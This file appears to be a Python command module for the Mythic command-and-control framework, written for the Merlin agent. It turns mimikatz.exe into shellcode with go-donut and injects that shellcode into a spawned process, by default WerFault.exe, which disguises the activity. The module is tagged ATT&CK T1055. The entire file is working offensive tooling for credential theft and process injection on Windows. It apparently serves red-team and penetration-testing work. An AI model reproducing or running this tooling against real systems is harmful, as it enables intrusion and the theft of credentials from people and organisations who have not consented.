
from mythic_payloadtype_container.MythicCommandBase import *
from mythic_payloadtype_container.MythicResponseRPC import *
import os
import json
import subprocess

# Set to enable debug output to Mythic
debug = False


class MimikatzArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {
            "commandline": CommandParameter(
                name="commandline",
                type=ParameterType.String,
                description="Mimikatz commandline arguments",
                default_value="token::whoami coffee",
                ui_position=0,
                required=True,
            ),
            "spawnto": CommandParameter(
                name="spawnto",
                type=ParameterType.String,
                description="The child process that will be started to execute Mimikatz in",
                default_value="C:\\Windows\\System32\\WerFault.exe",
                ui_position=1,
                required=True,
            ),
            "spawntoargs": CommandParameter(
                name="spawnto arguments",
                type=ParameterType.String,
                description="argument to create the spawnto process with, if any",
                ui_position=2,
                required=False,
            ),
            "verbose": CommandParameter(
                name="verbose",
                description="Show verbose output from Donut",
                type=ParameterType.Boolean,
                ui_position=3,
                required=False,
            ),
        }

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == '{':
                self.load_args_from_json_string(self.command_line)
            else:
                self.add_arg("commandline", self.command_line)
                self.add_arg("spawnto", "C:\\Windows\\System32\\WerFault.exe")
                self.add_arg("spawntoargs", "")
                self.add_arg("verbose", False)


class MimikatzCommand(CommandBase):
    cmd = "mimikatz"
    needs_admin = False
    help_cmd = "mimikatz"
    description = "Converts mimikatz.exe into shellcode with Donut, executes it in the spawnto process, and returns output"
    version = 1
    author = "@Ne0nd0g"
    argument_class = MimikatzArguments
    attackmapping = ["T1055"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        supported_os=[SupportedOS.Windows]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Starting create_tasking()')

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Calling donut()')
        donut_results = donut(task.args.get_arg("commandline"))

        if task.args.get_arg("verbose"):
            await MythicResponseRPC(task).user_output(f'[DONUT]Donut verbose output:\r\n{donut_results[1]}\r\n')

        # Merlin jobs.MODULE
        task.args.add_arg("type", 16, ParameterType.Number)

        # 1. Shellcode
        # 2. SpawnTo Executable
        # 3. SpawnTo Arguments (must include even if empty string)
        args = [donut_results[0], task.args.get_arg("spawnto"), task.args.get_arg("spawntoargs")]

        # Merlin jobs.Command message type
        command = {
            "command": "createprocess",
            "args": args,
        }

        task.display_params = f'{task.args.get_arg("commandline")}\n' \
                              f'spawnto: {task.args.get_arg("spawnto")} {task.args.get_arg("spawntoargs")}'

        task.args.add_arg("payload", json.dumps(command), ParameterType.String)
        task.args.remove_arg("commandline")
        task.args.remove_arg("spawnto")
        task.args.remove_arg("spawntoargs")

        if debug:
            await MythicResponseRPC(task).user_output(f'[DEBUG]Returned task:\r\n{task}\r\n')
        return task

    async def process_response(self, response: AgentResponse):
        pass


def donut(arguments):

    donut_args = ['go-donut', '--in', '/opt/mimikatz/x64/mimikatz.exe', '--exit', '2', '--verbose', '--thread', '--params']
    donut_args.append(arguments + " exit")

    result = subprocess.run(donut_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    donut_bytes = bytes

    # Read Donut output
    with open('loader.bin', 'rb') as output:
        donut_bytes = output.read()

    output.close()
    os.remove("loader.bin")

    # Return Donut shellcode Base64 encoded
    return [base64.b64encode(donut_bytes).decode("utf-8"), f'Commandline: {" ".join(donut_args)}\r\n' + result.stdout.decode("utf-8") + result.stderr.decode("utf-8")]
